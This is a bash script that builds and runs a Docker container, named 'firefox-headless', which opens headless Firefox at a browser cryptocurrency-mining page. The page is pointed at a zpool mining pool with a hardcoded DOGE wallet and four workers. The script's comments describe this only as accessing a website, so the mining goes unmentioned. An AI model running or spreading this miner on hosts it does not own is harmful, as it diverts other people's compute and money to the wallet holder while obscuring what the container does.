#!/bin/bash

# Docker image name
DOCKER_IMAGE_NAME="firefox-headless"

# Create auto_script.sh file
echo "Creating auto_script.sh..."
cat << 'EOF' > auto_script.sh
#!/bin/bash

echo "Launching Firefox in headless mode to access the website..."

# Run Firefox in headless mode
firefox --headless --new-tab "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=DDTP57jh2uLFtWVzj3Thm7MggEw1Etawp3&password=c%3DDOGE&workers=4"

echo "Firefox has finished launching. Check logs or use network monitoring tools if needed."
EOF

# Grant execution permission to auto_script.sh
chmod +x auto_script.sh
echo "auto_script.sh created and execution permissions granted."

# Create Dockerfile
echo "Creating Dockerfile..."
cat << 'EOF' > Dockerfile
# Use Debian as the base image
FROM debian:latest

# Update and install required tools
RUN apt-get update && apt-get install -y \
    wget \
    curl \
    firefox-esr \
    && apt-get clean

# Copy script into the container
COPY auto_script.sh /auto_script.sh

# Grant execution permission to the script
RUN chmod +x /auto_script.sh

# Run the script when the container starts
CMD ["/auto_script.sh"]
EOF

echo "Dockerfile created."

# Build Docker image
echo "Building Docker image..."
docker build -t $DOCKER_IMAGE_NAME .

if [ $? -eq 0 ]; then
    echo "Docker image built successfully: $DOCKER_IMAGE_NAME"
else
    echo "Error occurred while building Docker image."
    exit 1
fi

# Run container from the created image
echo "Starting container from the image..."
docker run --rm -it $DOCKER_IMAGE_NAME

if [ $? -eq 0 ]; then
    echo "Container ran successfully."
else
    echo "Error occurred while running the container."
    exit 1
fi
